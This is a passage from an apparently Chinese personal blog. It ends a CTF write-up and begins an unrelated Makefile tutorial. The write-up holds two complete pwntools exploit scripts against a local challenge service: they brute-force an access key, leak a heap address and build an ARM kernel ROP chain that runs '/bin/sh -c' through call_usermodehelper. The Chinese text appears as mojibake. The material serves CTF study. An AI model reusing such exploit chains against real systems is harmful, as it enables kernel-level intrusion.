class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                          pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                          sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                          rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                          pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c040</span>),stack+<span class="number">4</span>*<span class="number">19</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+save_sp-<span class="number">0x24</span>),stack+<span class="number">4</span>*<span class="number">22</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8022b754</span>),stack+<span class="number">4</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8022b754 &lt;dio_complete+120&gt;    ldr    ip, [r4, #0x24]</span></span><br><span class="line"><span class="string">    0x8022b758 &lt;dio_complete+124&gt;    stm    sp, &#123;r7, ip&#125;</span></span><br><span class="line"><span class="string">    0x8022b75c &lt;dio_complete+128&gt;    blx    r1 </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125; &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+sl),stack+<span class="number">4</span>*<span class="number">30</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;                  &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">33</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">37</span>)  <span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">38</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80101524</span>),stack+<span class="number">4</span>*<span class="number">39</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80101524 &lt;secondary_startup_arm+100&gt;    mov    sp, ip</span></span><br><span class="line"><span class="string">    0x80101528 &lt;secondary_startup_arm+104&gt;    ldr    ip, [sl, #0x10]</span></span><br><span class="line"><span class="string">    0x8010152c &lt;secondary_startup_arm+108&gt;    add    ip, ip, sl</span></span><br><span class="line"><span class="string">    0x80101530 &lt;secondary_startup_arm+112&gt;    mov    pc, ip</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    offsets=(call_usermodehelper-(heap+sl))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    payload=str_change(payload,p32(offsets),sl+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç®€åŒ–ç‰ˆ</p>
<p>ä¹Ÿå°±ç®€åŒ–äº†20è¡ŒğŸ˜¢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span>    <span class="comment"># server(&quot;\x10&quot;,1,&#x27;b&#x27;)</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack+<span class="number">4</span>*<span class="number">20</span>),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80427e38</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">16</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    payload=str_change(payload,p32(call_usermodehelper),stack+<span class="number">4</span>*<span class="number">18</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80427e38 &lt;call_with_stack+32&gt;:	ldr	sp, [sp, #4]</span></span><br><span class="line"><span class="string">    0x80427e3c &lt;call_with_stack+36&gt;:	bx	lr</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯¹æ ‡å¿—æ§åˆ¶ä¸ä¸¥æ ¼å¯¼è‡´çš„æ¼æ´ç±»å‹æœ‰äº†æ¯”è¾ƒæ·±åˆ»çš„å°è±¡ï¼Œäº†è§£å­¦ä¹ äº†armæŒ‡ä»¤é›†ä»¥åŠå¯»æ‰¾gadgetçš„æ€è·¯ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/08/makefile/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/08/makefile/" class="post-title-link" itemprop="url">makefile</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-09-08 17:15:57 / ä¿®æ”¹æ—¶é—´ï¼š17:16:13" itemprop="dateCreated datePublished" datetime="2022-09-08T17:15:57+08:00">2022-09-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Makefileå­¦ä¹ "><a href="#Makefileå­¦ä¹ " class="headerlink" title="Makefileå­¦ä¹ "></a>Makefileå­¦ä¹ </h1><p>ä¹‹å‰åªæ˜¯ç•¥æœ‰äº†è§£ï¼Œæ„Ÿè§‰ååˆ†æ–¹ä¾¿ï¼Œæ‰€ä»¥æƒ³æ·±å…¥äº†è§£ä¸€ä¸‹ã€‚</p>
<h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>Makefileæ˜¯ä¸€ä¸ªè§„åˆ™æ–‡ä»¶ï¼Œmakeæ˜¯ä¸€ä¸ªç¨‹åºï¼Œåœ¨å‘½ä»¤è¡Œé”®å…¥makeåï¼Œmakeè‡ªåŠ¨æ‰¾è§Makefileæ¥è§£æå…¶ä¸­çš„è§„åˆ™æ¥å®Œæˆç¼–è¯‘å·¥ä½œã€‚</p>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello-world"></a>hello-world</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907185029578.png" alt="image-20220907185029578"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:</span><br><span class="line">	@echo &quot;hello world&quot;</span><br><span class="line">	@ls ./</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">Makefile</span><br></pre></td></tr></table></figure>

